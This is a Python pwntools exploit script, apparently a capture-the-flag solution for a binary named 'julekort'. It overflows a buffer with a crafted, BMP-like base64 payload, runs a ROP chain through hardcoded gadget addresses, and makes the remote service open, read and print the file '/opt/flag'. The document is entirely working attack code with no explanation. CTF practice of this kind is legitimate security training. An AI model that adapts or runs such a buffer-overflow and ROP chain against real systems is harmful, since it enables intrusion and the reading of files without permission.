from pwn import *
from base64 import b64encode

exe = ELF("./julekort")
context.binary = exe
context.arch = "amd64"

pop_rdx = 0x41c212 # contains add byte ptr [rax], al
pop_rax = 0x42c46b

def fill_rdx(rop_obj, val):
    rop_obj.raw(pop_rax)
    rop_obj.raw(0x4b7700)
    rop_obj.raw(pop_rdx)
    rop_obj.raw(val)
    
exe_rop = ROP(exe)

fill_rdx(exe_rop, 9)
exe_rop.call('read', [0,0x4b9000])
exe_rop.call('open', [0x4b9000, 0])
fill_rdx(exe_rop, 50)
exe_rop.call('read', [3,0x4ba000])
fill_rdx(exe_rop, 50)
exe_rop.call('write', [0,0x4ba000])

ropchain = exe_rop.chain()
payload = p64(0x4d42) + b"A"*206 + ropchain

p = remote('wackattack-cf0d-julepwn.ept.gg', 1337, ssl=True)
p.sendlineafter(b"file:", b64encode(payload))
p.sendlineafter(b"image:", b"wack")
sleep(1)
p.sendline(b"/opt/flag")
p.interactive()

# with open("image.bmp", "wb") as f:
#     f.write(payload)
#     f.close()

# with open("message.txt", "wb") as f:
#     f.write(b"CCCC")
#     f.close()


